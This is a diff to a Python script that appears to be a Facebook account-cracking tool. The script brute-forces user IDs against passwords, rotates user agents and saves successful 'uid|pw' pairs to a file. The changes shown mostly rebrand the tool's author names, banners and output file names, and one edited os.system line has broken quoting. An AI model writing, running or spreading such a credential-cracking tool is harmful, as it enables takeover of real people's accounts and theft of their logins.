@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ AUH ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ khushi ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -399,9 +399,9 @@ logo = ("""
 \033[1;33m│ [✓] AUTHOR   : khushi\033[1;32m[queen]              │
 \033[1;34m│ [✓] GITHUB   :\033[1;32mkhushi404                    │
 \033[1;35m│ [✓] WHATSAPP :  032*******         │
-\033[1;36m│ [✓] POWER BY🌿🌺 : \x1b[1;32mkhushi\x1b[1;97m      │
+\033[1;36m│ [✓] POWER BY : \x1b[1;32mkhushi\x1b[1;97m      │
 \033[1;32m└───────────────────────────────────────┘  
- \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [khushi] [baloch]\x1b[0m    """)
+ \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [khushi] [malik]\x1b[0m    """)
 
 class Main:
 	def __init__(self):
@@ -428,7 +428,7 @@ class Main:
 			print("    Thanks♥️")
 			exit() 
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-openhttps://www.facebook.com/profile.php?id=100005069806504 ")
+			os.system("xdg-open  "https://www.facebook.com/profile.php?id=100005069806504)
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
@@ -441,7 +441,7 @@ class Main:
 			os.system("clear")
 		print()
 		print("""
-  _  ___               _     _ 
+ _  ___               _     _ 
  | |/ / |             | |   (_)
  | ' /| |__  _   _ ___| |__  _ 
  |  < | '_ \| | | / __| '_ \| |
@@ -456,9 +456,9 @@ class Main:
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.0
 \033[1;37m================= \33[32;45mkhushi33[0;m =====================
  
-       \33[37;41m\t WELLCOME TO khushi TOOL\33[0;m
+       \33[37;41m\t WELLCOME TO MR-AUH TOOL\33[0;m
  
-\033[1;37m================== \33[32;45mKHUSHI\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mKHUSHI HUN YARW\33[0;m ======================\n""")
 		
 		print("╭──────────────────────────────────────────────────────────────╮")
 		print("│ [1] CRACK FILE CLONING (\x1b[1;92mFREE\x1b[1;92m)                                │")
@@ -901,7 +901,7 @@ class Main:
 				print("\r \033[0;92m[ khushi-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-AHSAM-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-khushi-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ khushi-OK ] %s | %s\033[0;97m         "%(uid, pw))
